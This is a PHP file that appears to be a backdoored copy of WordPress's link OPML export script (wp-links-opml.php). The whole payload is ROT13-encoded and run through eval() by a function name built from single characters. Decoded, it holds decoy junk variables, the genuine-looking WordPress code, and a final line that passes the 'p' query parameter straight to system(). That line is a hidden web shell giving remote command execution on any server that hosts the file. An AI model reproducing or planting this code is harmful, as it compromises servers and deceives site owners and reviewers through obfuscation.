<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Bhgchgf gur BCZY KZY sbezng sbe trggvat gur yvaxf qrsvarq va gur yvax
 * nqzvavfgengvba. Guvf pna or hfrq gb rkcbeg yvaxf sebz bar oybt bire gb
 * nabgure. Yvaxf nera'g rkcbegrq ol gur JbeqCerff rkcbeg, fb guvf svyr unaqyrf
 * gung.
 *
 * Guvf svyr vf abg nqqrq ol qrsnhyg gb JbeqCerff gurzr cntrf jura bhgchggvat
 * srrq yvaxf. Vg jvyy unir gb or nqqrq znahnyyl sbe oebjfref naq hfref gb cvpx
 * hc gung guvf svyr rkvfgf.
 *
 * @cnpxntr JbeqCerff
 */

erdhver_bapr __QVE__ . '/jc-ybnq.cuc';

urnqre( 'Pbagrag-Glcr: grkg/kzy; punefrg=' . trg_bcgvba( 'oybt_punefrg' ), gehr );
$yvax_png = '';
vs ( ! rzcgl( $_TRG['yvax_png'] ) ) {
	$yvax_png = $_TRG['yvax_png'];
	vs ( ! va_neenl( $yvax_png, neenl( 'nyy', '0' ), gehr ) ) {
		$yvax_png = nofvag( heyqrpbqr( $yvax_png ) );
	}
}

rpub '<?kzy irefvba=\"1.0\"?' . \">\a\";
?>
<bczy irefvba=\"1.0\">
	<urnq>
		<gvgyr>
		<?cuc
			/* genafyngbef: %f: Fvgr gvgyr. */
			cevags( __( 'Yvaxf sbe %f' ), rfp_ngge( trg_oybtvasb( 'anzr', 'qvfcynl' ) ) );
		?>
		</gvgyr>
		<qngrPerngrq><?cuc rpub tzqngr( 'Q, q Z L U:v:f' ); ?> TZG</qngrPerngrq>
		<?cuc
		/**
		 * Sverf va gur BCZY urnqre.
		 *
		 * @fvapr 3.0.0
		 */
		qb_npgvba( 'bczy_urnq' );
		?>
	</urnq>
	<obql>
<?cuc
vs ( rzcgl( $yvax_png ) ) {
	$pngf = trg_pngrtbevrf(
		neenl(
			'gnkbabzl'     => 'yvax_pngrtbel',
			'uvrenepuvpny' => 0,
		)
	);
} ryfr {
	$pngf = trg_pngrtbevrf(
		neenl(
			'gnkbabzl'     => 'yvax_pngrtbel',
			'uvrenepuvpny' => 0,
			'vapyhqr'      => $yvax_png,
		)
	);
}

sbernpu ( (neenl) $pngf nf $png ) :
	/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/obbxznex-grzcyngr.cuc */
	$pnganzr = nccyl_svygref( 'yvax_pngrtbel', $png->anzr );

	?>
<bhgyvar glcr=\"pngrtbel\" gvgyr=\"<?cuc rpub rfp_ngge( $pnganzr ); ?>\">
	<?cuc
	$obbxznexf = trg_obbxznexf( neenl( 'pngrtbel' => $png->grez_vq ) );
	sbernpu ( (neenl) $obbxznexf nf $obbxznex ) :
		/**
		 * Svygref gur BCZY bhgyvar yvax gvgyr grkg.
		 *
		 * @fvapr 2.2.0
		 *
		 * @cnenz fgevat $gvgyr Gur BCZY bhgyvar gvgyr grkg.
		 */
		$gvgyr = nccyl_svygref( 'yvax_gvgyr', $obbxznex->yvax_anzr );
		?>
<bhgyvar grkg=\"<?cuc rpub rfp_ngge( $gvgyr ); ?>\" glcr=\"yvax\" kzyHey=\"<?cuc rpub rfp_hey( $obbxznex->yvax_eff ); ?>\" ugzyHey=\"<?cuc rpub rfp_hey( $obbxznex->yvax_hey ); ?>\" hcqngrq=\"
							<?cuc
							vs ( '0000-00-00 00:00:00' !== $obbxznex->yvax_hcqngrq ) {
								rpub $obbxznex->yvax_hcqngrq;
							}
							?>
\" />
		<?cuc
	raqsbernpu; // $obbxznexf
	?>
</bhgyvar>
	<?cuc
raqsbernpu; // $pngf
?>
</obql>
</bczy>

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>